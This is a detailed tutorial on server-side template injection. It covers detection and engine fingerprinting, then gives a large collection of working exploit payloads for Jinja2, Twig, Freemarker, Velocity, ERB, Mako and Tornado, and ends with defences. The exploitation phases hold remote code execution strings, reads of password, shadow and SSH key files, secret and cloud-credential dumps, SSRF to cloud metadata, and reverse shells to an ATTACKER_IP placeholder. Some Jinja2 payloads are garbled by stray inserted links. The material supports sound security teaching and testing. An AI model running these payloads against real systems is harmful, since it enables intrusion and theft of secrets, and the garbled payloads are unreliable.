# Server-Side Template Injection (SSTI)

Server-side template injection is one of the most impactful vulnerability classes in modern web applications because it subverts a trusted server-side component — the template engine — into an arbitrary code execution primitive. Unlike XSS, which executes in the victim's browser, SSTI runs entirely on the server, putting the entire host, its environment variables, its file system, and its internal network within reach of the attacker. The root cause is deceptively simple — user input concatenated into a template string rather than passed as data — but the consequences span from sensitive data exposure to full remote code execution, shell access, and lateral movement into internal infrastructure.

**Fundamental principle: A template engine evaluates anything in its context window as code, not data — so the moment user input becomes part of the template string itself rather than a variable passed into it, the attacker controls what the engine executes on the server.**

***

## How Template Engines Work

Understanding the vulnerability requires understanding what template engines are designed to do.

```
Legitimate template usage — user input as DATA, not as part of the template:
────────────────────────────────────────────────────────────────────────────
           Template string (fixed)              Data (variable)
                     │                               │
  "Dear {{first_name}},"        +     {"first_name": "Carlos"}
                     │                               │
                     └──────────┬────────────────────┘
                                ▼
                         Template Engine
                                ▼
                         "Dear Carlos,"         ← first_name is DATA,
                                                   never evaluated as code
                                                   ✓ SAFE

Vulnerable template usage — user input CONCATENATED into the template string:
────────────────────────────────────────────────────────────────────────────
  Template string is BUILT at runtime by joining user input:

  "Dear " + GET['name']     →    "Dear {{7*7}}"   (if attacker sends name={{7*7}})
                                         │
                                   Template Engine
                                         │
                                    evaluates {{7*7}}
                                         │
                                   "Dear 49"      ← mathematical expression
                                                     executed on server
                                                     ✗ VULNERABLE

  Attack payload: name={{bad-stuff-here}}
  Endpoint: http://vulnerable-website.com/?name={{bad-stuff-here}}
```

### Where SSTI Vulnerabilities Appear

```
Common injection surfaces in web applications:
────────────────────────────────────────────────────────────────────────────
✓ URL parameters reflected in template output
  → ?name=Carlos  →  Dear Carlos,
  → test with: ?name={{7*7}}

✓ Search fields (search term reflected in results page)
  → "No results for: [user input]"

✓ Error messages constructed with user input
  → "Product [user input] not found"

✓ Custom email templates (marketing platforms, CMS systems)
  → User uploads/edits template containing {{user_input}}

✓ User profile fields rendered by templates
  → Display name, bio, address fields in user dashboards

✓ Feedback / review / comment fields that render with markdown or template syntax

✓ CMS / wiki page content editors (privileged users given template access)

✓ URL path segments rendered into page content
  → /greet/Carlos  →  render("Hello " + url_param)

✓ HTTP headers reflected into templated error pages
  → User-Agent, Referer, X-Forwarded-For included in debug output
```

***

## Phase 1: Detection

### Fuzzing for Template Syntax Errors

```
# ── STEP 1: Universal fuzz string ────────────────────────────────────────────
# Inject into every input field, URL parameter, HTTP header.
# Contains special characters used by most template engines.
# A server error or unexpected output confirms potential SSTI.

${{<%[%'"}}%\

# Send as:
?name=${{<%[%'"}}%\

# Possible responses:
#  ✓ 500 Internal Server Error  → template engine choked on injected syntax
#  ✓ Template parsing error     → confirms template evaluation of user input
#  ✓ Garbled output             → partial template evaluation occurred
#  ✗ Input reflected verbatim   → likely not SSTI (could still be code context)
#  ✗ Input HTML-encoded         → possible encoding barrier, try other contexts


# ── STEP 2: Mathematical expression probes ────────────────────────────────────
# Different engines use different delimiters. Test each syntax family.
# A calculated result (49, 7777777) in the response confirms server evaluation.

# Probe set 1 — double curly brace engines (Jinja2, Twig, Handlebars):
?name={{7*7}}
?name={{7*'7'}}

# Probe set 2 — dollar-brace engines (Freemarker, Velocity, Thymeleaf):
?name=${7*7}
?name=#{7*7}

# Probe set 3 — ERB / EJS:
?name=<%= 7*7 %>

# Probe set 4 — Mako / Smarty:
?name=${7*7}
?name={7*7}

# Interpret results:
# Response contains 49        → arithmetic evaluated → SSTI confirmed
# Response contains 7777777   → string repetition evaluated → SSTI confirmed
# Response unchanged / error  → try next syntax family
```

### Detecting Context: Plaintext vs. Code

```
# ── PLAINTEXT CONTEXT ─────────────────────────────────────────────────────────
# The user input is concatenated as a raw string into the template.
# Example vulnerable backend code:
#
#   render('Hello ' + username)    ← Python / Jinja2 / Tornado
#   $twig->render("Dear " . $_GET['name'])    ← PHP / Twig
#
# Detection: inject a mathematical expression
# URL: http://target.com/?username=${7*7}
# Expected (vulnerable): "Hello 49"          ← expression was evaluated
# Expected (not SSTI):   "Hello ${7*7}"      ← reflected verbatim


# ── CODE CONTEXT ──────────────────────────────────────────────────────────────
# The user input is placed INSIDE an existing template expression:
#
#   greeting = getQueryParameter('greeting')
#   engine.render("Hello {{ " + greeting + " }}", data)
#
# Normal usage: ?greeting=data.username  →  "Hello Carlos"
# This is easily mistaken for a hashmap lookup and missed during review.
#
# STEP 1: Test for XSS first (to establish it's not plain reflection)
# URL: http://target.com/?greeting=data.username<tag>
# Result: blank output, encoded <tag>, or error → not simple XSS
#
# STEP 2: Try to break out of the template expression with closing syntax
# URL: http://target.com/?greeting=data.username}}<tag>
# Result A: error or blank       → wrong template syntax, try another engine
# Result B: "Hello Carlos<tag>"  → broke out of {{ }} expression → SSTI confirmed
#
# Confirmation flow:
#
#  Input:          data.username}}<h1>INJECTED</h1>
#                               ↑
#                               closes the existing {{ }} block, then injects HTML
#
#  Template becomes:  Hello {{ data.username }}<h1>INJECTED</h1>
#  Output:            Hello Carlos<h1>INJECTED</h1>   ← SSTI in code context ✓
```

***

## Phase 2: Engine Identification

### Decision Tree

```
SSTI Engine Identification Decision Tree
────────────────────────────────────────────────────────────────────────────

                START: SSTI confirmed, engine unknown
                            │
                    Send: {{7*7}}
                   ┌────────┴────────┐
              = 49 ↓                 ↓ error / literal
       Jinja2 or Twig             Send: ${7*7}
             │                ┌──────┴──────┐
    Send: {{7*'7'}}        = 49 ↓            ↓ error
    ┌────────┴────────┐  Freemarker      Send: <%= 7*7 %>
    ↓ 49     ↓ 7777777  or Velocity     ┌────┴────┐
   Twig     Jinja2          │        = 49 ↓        ↓ error
                    Send: ${"freemarker.template.utility.Execute"?new()("id")}
                    ┌─────────┴─────────┐        ERB/EJS   Smarty/Mako
               works ↓                  ↓ error
            Freemarker              Velocity

──────────────── SEPARATE DISTINGUISHING PROBES ────────────────────────────

Jinja2 vs Twig (both return 49 for {{7*7}}):
  {{7*'7'}}  →  7777777    = Jinja2   (string * int = repetition)
  {{7*'7'}}  →  49         = Twig     (coerces string to int)

Freemarker vs Velocity (both use ${...}):
  ${7*'7'}  →  error       = Freemarker  (type mismatch error)
  $class    →  accessible  = Velocity    ($class is Velocity-specific object)

ERB vs EJS:
  <%= File.read('/etc/passwd') %>   →  works in ERB  (Ruby)
  <%= require('fs') %>              →  works in EJS  (Node.js)

──────────────── ERROR-BASED FINGERPRINTING ────────────────────────────────

# Sending deliberately invalid syntax often leaks engine name + version

# ERB (Ruby):
<%= foobar %>
# → (erb):1:in `<main>': undefined local variable or method `foobar'
#    from /usr/lib/ruby/2.5.0/erb.rb:876 in `eval'
#                              ↑ confirms ERB + Ruby version

# Freemarker (Java):
${foobar}
# → freemarker.core.InvalidReferenceException: The following has evaluated
#   to null or missing: ==> foobar [...]
#                   ↑ confirms Freemarker

# Twig (PHP):
{{foobar}}
# → Twig_Error_Runtime: Variable "foobar" does not exist in ...
#                  ↑ confirms Twig

# Jinja2 (Python):
{{foobar}}
# → jinja2.exceptions.UndefinedError: 'foobar' is undefined
```

***

## Phase 3: Exploitation by Engine

### Jinja2 (Python / Flask)

```python
# ── ENVIRONMENT EXPLORATION ───────────────────────────────────────────────────

# Dump all variables in the template context:
{{self}}
{{config}}                           # Flask config — may contain SECRET_KEY, DB passwords
{{config.items()}}                   # iterate config key-value pairs
{{request}}                          # Flask request object

# Example output — config leak:
# <Config {'DEBUG': True, 'SECRET_KEY': 'very-secret-key', 'SQLALCHEMY_DATABASE_URI': 'mysql://...'}>


# ── OBJECT TRAVERSAL TO OS ACCESS ─────────────────────────────────────────────
# Jinja2 exposes Python's object model. By traversing the class hierarchy,
# we can reach os.system or subprocess without importing anything.

# Step 1 — Enumerate subclasses of object base class
{{''.__class__.__mro__ [portswigger](https://portswigger.net/web-security/server-side-template-injection).__subclasses__()}}
# → lists all loaded Python classes in memory
# Scan output for useful classes: subprocess.Popen, os._wrap_close, warnings.catch_warnings

# Step 2 — Find Popen index (varies per application)
# Iterate looking for 'subprocess.Popen':
{% for c in ''.__class__.__mro__ [portswigger](https://portswigger.net/web-security/server-side-template-injection).__subclasses__() %}
{% if 'Popen' in c.__name__ %}
{{ c }}  ← index this
{% endif %}
{% endfor %}

# Step 3 — RCE via Popen (replace INDEX with the found index number):
{{''.__class__.__mro__ [portswigger](https://portswigger.net/web-security/server-side-template-injection).__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
# Example with index 407:
{{''.__class__.__mro__ [portswigger](https://portswigger.net/web-security/server-side-template-injection).__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0]}}

# ── SIMPLER RCE PAYLOADS (Flask/Jinja2) ──────────────────────────────────────

# Via __import__ through globals:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Via cycler object (no index scanning required):
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Via joiner or namespace:
{{joiner.__init__.__globals__.os.popen('whoami').read()}}
{{namespace.__init__.__globals__.os.popen('cat /etc/passwd').read()}}

# Via lipsum (available in Jinja2 2.x):
{{lipsum.__globals__['os'].popen('id').read()}}

# ── FILE READ ────────────────────────────────────────────────────────────────

{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}

# ── REVERSE SHELL ─────────────────────────────────────────────────────────────

{{cycler.__init__.__globals__.os.popen('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1').read()}}

# ── SANDBOX ESCAPE ────────────────────────────────────────────────────────────
# When Jinja2 is running in a sandboxed environment that blocks attribute access,
# try using the |attr filter to bypass attribute access restrictions:

{{()|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(INDEX)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
```

### Twig (PHP)

```php
// ── BASIC PROBES ──────────────────────────────────────────────────────────────

// Confirm Twig:
{{7*7}}           // → 49
{{7*'7'}}         // → 49  (Twig coerces string to int — distinguishes from Jinja2)
{{_self}}         // → Twig template object
{{_self.env}}     // → Twig environment object
{{dump(app)}}     // → full Symfony application context (if Symfony is used)
{{app.request}}   // → HTTP request object (Symfony/Twig)


// ── RCE VIA filter + registerUndefinedFilterCallback ─────────────────────────
// _self.env.registerUndefinedFilterCallback registers a PHP function
// as a filter. Then pass a command through the filter.

{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
// → _self.env registered exec() as a filter
// → getFilter("id") calls exec("id") → outputs UID info


// ── RCE VIA getFilter with system() ──────────────────────────────────────────

{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("passthru")}}
{{_self.env.getFilter("cat /etc/passwd")}}


// ── RCE VIA Twig filters in older versions ────────────────────────────────────

// Twig < 1.29.0 — map filter with arrow function:
{{["id"]|map("system")|join}}
{{["id"]|map("passthru")|join}}
{{["id"]|map("shell_exec")|join}}

// Twig < 2.x — filter usage:
{{"id"|exec}}


// ── FILE READ ────────────────────────────────────────────────────────────────

{{_self.env.registerUndefinedFilterCallback("file_get_contents")}}
{{_self.env.getFilter("/etc/passwd")}}


// ── RCE WITHOUT QUOTES (quote filtering bypass) ──────────────────────────────
// When the application filters single/double quotes, use Twig's block + _charset:

{%block U%}id000passthru{%endblock%}
{%set x=block(_charset|first)|split(000)%}
{{[x|first]|map(x|last)|join}}
// → calls passthru("id") → outputs id command result
```

### Freemarker (Java)

```java
// ── BASIC PROBES ──────────────────────────────────────────────────────────────

// Confirm Freemarker:
${7*7}          // → 49
${foobar}       // → InvalidReferenceException leaking "freemarker" in stack trace


// ── RCE VIA Execute class ─────────────────────────────────────────────────────
// Freemarker's Execute class (freemarker.template.utility) can run OS commands.

${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
${"freemarker.template.utility.Execute"?new()("bash -i >& /dev/tcp/ATTACKER/4444 0>&1")}


// ── RCE VIA ObjectConstructor ─────────────────────────────────────────────────

${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",
  new java.util.ArrayList(["id"])).start().text}


// ── ENVIRONMENT ENUMERATION ───────────────────────────────────────────────────

// List all environment variables (Java):
${T(java.lang.System).getenv()}

// Read system properties:
${T(java.lang.System).getProperty("java.class.path")}
${T(java.lang.System).getProperty("user.home")}

// List files in directory:
${"freemarker.template.utility.Execute"?new()("ls -la /home")}


// ── FILE READ ────────────────────────────────────────────────────────────────

<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("cat /etc/passwd") }
```

### Velocity (Java)

```java
// ── BASIC PROBES ──────────────────────────────────────────────────────────────

// Confirm Velocity:
#set($x = 7*7) $x                    // → 49
$class                                // → Velocity ClassTool object


// ── RCE VIA ClassTool + Runtime ───────────────────────────────────────────────

// Chain ClassTool → java.lang.Runtime → exec()
#set($rt = $class.inspect("java.lang.Runtime").type)
#set($proc = $rt.getRuntime().exec("id"))
#set($inputStream = $proc.getInputStream())
#set($reader = $class.inspect("java.io.InputStreamReader").type.getDeclaredConstructors()[0])
#set($br = $class.inspect("java.io.BufferedReader").type.getDeclaredConstructors()[0])
$br.newInstance($reader.newInstance($inputStream)).readLine()


// ── SHORTER RCE CHAIN ─────────────────────────────────────────────────────────

$class.inspect("java.lang.Runtime").type.getRuntime().exec("touch /tmp/pwned")


// ── RCE VIA ProcessBuilder ────────────────────────────────────────────────────

#set($pb = $class.inspect("java.lang.ProcessBuilder").type.getDeclaredConstructors()[0])
#set($proc = $pb.newInstance([["id"]]).start())
// capture output via InputStream as above


// ── ENVIRONMENT ENUMERATION ───────────────────────────────────────────────────

$class.inspect("java.lang.System").type.getenv()
$class.inspect("java.lang.System").type.getProperty("user.dir")
```

### ERB (Ruby)

```ruby
# ── BASIC PROBES ──────────────────────────────────────────────────────────────

# Confirm ERB (Ruby):
<%= 7*7 %>             # → 49
<%= 'test' %>          # → test (string reflection confirms ERB execution)
<%= foobar %>          # → NameError: undefined local variable — exposes ERB + Ruby version


# ── RCE ──────────────────────────────────────────────────────────────────────

<%= `id` %>                               # backtick shell execution
<%= system("id") %>                       # system() — prints to stdout
<%= IO.popen('id').read %>                # captures and returns output
<%= require 'open3'; Open3.capture2("id")[0] %>

# Full reverse shell:
<%= `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` %>


# ── FILE READ ────────────────────────────────────────────────────────────────

<%= Dir.entries('/') %>                   # list root directory
<%= File.open('/etc/passwd').read %>      # read arbitrary file
<%= File.read('/etc/shadow') %>           # read shadow passwords (if root)


# ── ENVIRONMENT ENUMERATION ───────────────────────────────────────────────────

<%= ENV %>                                # dump all environment variables
<%= ENV['SECRET_KEY_BASE'] %>            # Rails secret key (session forgery)
<%= ENV['DATABASE_URL'] %>               # database credentials
```

### Mako (Python)

```python
# ── BASIC PROBES ──────────────────────────────────────────────────────────────

# Confirm Mako:
${7*7}                # → 49
${7*'7'}              # → 49  (Mako performs int coercion — distinguishes from Jinja2)


# ── RCE — DIRECT IMPORT ──────────────────────────────────────────────────────
# Mako allows full Python code blocks with <% ... %> syntax.
# This makes exploitation especially clean — no traversal required.

<%
    import os
    x = os.popen('id').read()
%>
${x}

# Compact inline version:
${__import__('os').popen('id').read()}


# ── FILE READ ────────────────────────────────────────────────────────────────

<%
    x = open('/etc/passwd').read()
%>
${x}


# ── REVERSE SHELL ─────────────────────────────────────────────────────────────

<%
    import os
    os.system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')
%>
```

### Tornado (Python)

```python
# ── BASIC PROBES ──────────────────────────────────────────────────────────────

# Tornado uses {{ }} for expressions and {% %} for statements.
{{7*7}}           # → 49
{%import os%}{{os.popen('id').read()}}   # ← import + exec on one line


# ── RCE ──────────────────────────────────────────────────────────────────────

# Import via statement block, execute via expression block:
{%import os%}{{os.popen('id').read()}}
{%import os%}{{os.popen('cat /etc/passwd').read()}}
{%import subprocess%}{{subprocess.check_output('id',shell=True).decode()}}


# ── FILE READ ────────────────────────────────────────────────────────────────

{%import os%}{{open('/etc/passwd').read()}}
```

***

## Phase 4: Exploiting Without RCE — Data Extraction and File Access

Not all environments allow OS command execution. Even when RCE is blocked, SSTI still enables high-severity exploitation.

```python
# ── FLASK/JINJA2 — CONFIG AND SECRET KEY DUMP ─────────────────────────────────

{{config}}
# → <Config {'SECRET_KEY': 'dev-secret-abc123', 'SQLALCHEMY_DATABASE_URI':
#   'postgresql://appuser:password123@db:5432/appdb', 'DEBUG': True, ...}>

# SECRET_KEY enables:
#   → Flask session cookie forgery (sign arbitrary session data)
#   → HMAC bypass (admin=true in forged session)

# Extract specific keys:
{{config['SECRET_KEY']}}
{{config.get('DATABASE_URL')}}
{{config.__class__.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']}}


# ── ENVIRONMENT VARIABLE EXTRACTION ──────────────────────────────────────────

# Jinja2 — via os module:
{{cycler.__init__.__globals__.os.environ}}

# ERB — all env vars:
<%= ENV.to_a.map{|k,v| "#{k}=#{v}"}.join("\n") %>

# Freemarker — Java system properties:
${T(java.lang.System).getenv()}


# ── FILE PATH TRAVERSAL ───────────────────────────────────────────────────────

# ERB file read:
<%= File.read('/etc/passwd') %>
<%= File.read('/var/www/html/config.php') %>
<%= File.read('/home/user/.ssh/id_rsa') %>

# Jinja2 file read:
{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
{{cycler.__init__.__globals__.os.popen('cat ~/.ssh/id_rsa').read()}}

# Freemarker file read:
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}


# ── SSRF VIA TEMPLATE ENGINE (Java) ──────────────────────────────────────────

# Freemarker — fetch internal URL (SSRF):
${"freemarker.template.utility.Execute"?new()("curl http://169.254.169.254/latest/meta-data/")}
# → AWS IMDS metadata — may expose IAM role credentials

# Velocity — open URL connection:
#set($url = $class.inspect("java.net.URL").type)
#set($conn = $url.getDeclaredConstructors()[0].newInstance(["http://169.254.169.254/latest/meta-data/"]).openStream())
```

***

## Phase 5: Custom Exploit Construction (Object Chaining)

When documented exploits fail (e.g., sandboxed engines, custom template setups), build a custom attack by exploring the object graph.

```python
# ── METHODOLOGY: Explore → Map → Chain → Exploit ─────────────────────────────

# STEP 1: Find all accessible top-level objects
# In Jinja2:
{{self.__dict__}}
{{dir(self)}}

# In Velocity:
$velocityCount    ← loop counter variable
$date             ← date tool
$math             ← math tool
$class            ← ClassTool — HIGH VALUE

# In Freemarker:
<#list .data_model?keys as k>${k} </#list>    ← list all variables in data model


# STEP 2: Drill into interesting objects
# Focus on:
#  - Objects that return other objects (especially Java Class references)
#  - Objects with exec(), popen(), read(), open() in their method list
#  - Objects granting access to __globals__ or __builtins__

# Jinja2 — find globals from any callable:
{{cycler.__init__.__globals__.keys()}}
# → dict_keys(['__name__', '__doc__', 'os', 'sys', 'request', 'url_for', ...])
#                                      ↑
#                             os module is present → popen() available


# STEP 3: Chain to reach OS primitives
# Velocity → ClassTool → Runtime:
#
# $class                          ← ClassTool entry point
#   .inspect("java.lang.Runtime") ← references Runtime class
#   .type                         ← gets the Class object
#   .getRuntime()                 ← gets the current Runtime instance
#   .exec("id")                   ← executes OS command
#
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")


# STEP 4: Exploit developer-supplied objects
# Applications often inject custom objects into the template context.
# These objects are undocumented and may not be sandboxed like built-ins.
#
# Example: application injects a 'user' object with a loadAvatar() method:
#
#   user.loadAvatar(filename)    ← takes a filename, reads from disk
#
# Test for path traversal:
{{user.loadAvatar('../../../../etc/passwd')}}
#
# Example: 'email' object with sendEmail(to, subject, body):
{{email.sendEmail('attacker@evil.com', 'test', 'SSRF test body')}}
# → can pivot to internal SMTP, internal service enumeration
```

***

## Defences: Preventing SSTI

### The Core Fix: Never Concatenate User Input into Template Strings

```python
# ── PYTHON / JINJA2 ──────────────────────────────────────────────────────────

from jinja2 import Environment, select_autoescape

# ✗ VULNERABLE — user input is part of the template string:
def render_greeting_vulnerable(name):
    template_str = "Dear " + name + ","        # ← name is IN the template
    return jinja2.from_string(template_str).render()

# Attacker sends: name={{config}}  →  Dear <Config {...SECRET_KEY...}>,


# ✓ SECURE — user input is passed as DATA, template string is static:
def render_greeting_secure(name):
    template_str = "Dear {{ name }},"           # ← static template, no concatenation
    return jinja2.from_string(template_str).render(name=name)
    #                                             ↑ name is DATA, never evaluated


# ✓ SECURE — using template files (best practice):
from jinja2 import Environment, FileSystemLoader, select_autoescape

env = Environment(
    loader=FileSystemLoader('templates'),        # ← load from file, not from string
    autoescape=select_autoescape(['html', 'xml']),  # ← auto-escape output
)

def render_greeting_from_file(name):
    template = env.get_template('greeting.html')  # ← static file
    return template.render(name=name)              # ← name is data


# ── PHP / TWIG ────────────────────────────────────────────────────────────────

// ✗ VULNERABLE — concatenating GET parameter into template string:
$output = $twig->render("Dear " . $_GET['name']);

// ✓ SECURE — static template, user input as variable:
$output = $twig->render("Dear {{ name }},", ['name' => $_GET['name']]);

// ✓ ALSO SECURE — render from file:
$output = $twig->render('greeting.html.twig', ['name' => $_GET['name']]);
```

### Use Logic-Less Template Engines

```javascript
// ── JavaScript / Mustache (logic-less engine) ─────────────────────────────────
// Mustache does not support arbitrary expression evaluation.
// It only supports variable substitution, loops, and conditionals.
// There is no code execution surface — SSTI is structurally impossible.

const Mustache = require('mustache');

// ✓ Logic-less — {{name}} is a variable substitution, not a code expression
const template = 'Dear {{name}},';
const output = Mustache.render(template, { name: userInput });
// Even if userInput = "{{config.__class__...}}" → output is the literal string,
// never evaluated as code ✓

// Comparison of template engine risk levels:
// ─────────────────────────────────────────
//  Logic-less (Mustache, Handlebars in strict mode)  → no code execution surface  ✓
//  Limited (Pug/Jade)                                → limited, but still risky   ⚠
//  Full-power (Jinja2, Twig, Freemarker, ERB, Mako)  → arbitrary code possible   ✗
```

### Sandboxing

```python
# ── JINJA2 SANDBOX ENVIRONMENT ────────────────────────────────────────────────
# SandboxedEnvironment restricts attribute access and prevents dangerous
# operations. Note: not a complete substitute for avoiding concatenation.

from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment(
    autoescape=True    # ✓ auto-escape all output
)

# SandboxedEnvironment blocks:
#  ✓ Access to __class__, __mro__, __subclasses__
#  ✓ Access to __globals__, __builtins__
#  ✓ Import statements (in Mako-style code blocks)
#  ✗ Does NOT prevent logic-based attacks (loops, data enumeration)
#  ✗ Known sandbox escapes exist — do not rely on this alone

# ✓ BEST PRACTICE: SandboxedEnvironment + static templates + input validation
template = env.from_string("Dear {{ name }},")   # static, not concatenated
output = template.render(name=user_input)


# ── INPUT VALIDATION (defence-in-depth) ───────────────────────────────────────

import re

def validate_template_input(user_input: str) -> str:
    """
    Reject inputs containing template expression syntax.
    This is defence-in-depth — the PRIMARY fix is not concatenating input.
    """
    # Patterns used by common template engines:
    dangerous_patterns = [
        r'\{\{.*\}\}',          # Jinja2/Twig/Handlebars {{ }}
        r'\$\{.*\}',            # Freemarker/Velocity ${}
        r'<%.*%>',              # ERB/EJS <% %>
        r'\{%.*%\}',            # Jinja2/Twig {% %}
        r'#\{.*\}',             # Pug/some Velocity #{  }
        r'#set\s*\(',           # Velocity #set(
        r'#foreach',            # Velocity/Freemarker loop directive
        r'<#.*>',               # Freemarker <#...>
    ]
    for pattern in dangerous_patterns:
        if re.search(pattern, user_input, re.DOTALL | re.IGNORECASE):
            raise ValueError(f"Invalid input: template syntax not allowed")
    return user_input

# ⚠ WARNING: Regex-based input filters are incomplete and bypassable.
# They should be used as an additional layer, never as the primary defence.
```

### Container / Process Isolation

```
# ── DEPLOYMENT-LEVEL HARDENING ────────────────────────────────────────────────
# Accept that if template injection is possible, code execution may follow.
# Limit the blast radius with OS-level and container-level controls.

Docker container hardening for template-rendering services:

  # docker-compose.yml — hardened template service
  template-service:
    image: app:latest
    read_only: true                      # ← filesystem read-only except mounted volumes
    security_opt:
      - no-new-privileges:true           # ← prevent privilege escalation via suid binaries
      - seccomp:seccomp-profile.json     # ← restrict available syscalls
    cap_drop:
      - ALL                              # ← drop all Linux capabilities
    cap_add:
      - NET_BIND_SERVICE                 # ← add back only what is needed
    user: "1000:1000"                    # ← run as non-root user
    tmpfs:
      - /tmp:size=64m,noexec             # ← /tmp is writable but non-executable
    networks:
      - internal                         # ← no direct internet access
    environment:
      - SECRET_KEY                       # ← inject secrets at runtime, not in image

Additional OS-level controls:
  ✓ AppArmor / SELinux profiles restricting file system access
  ✓ No outbound network from template worker (blocks reverse shells)
  ✓ Secrets not stored in environment variables — use secrets manager
  ✓ Read-only mounts for application code directories
  ✓ Template workers isolated from database and internal services
```
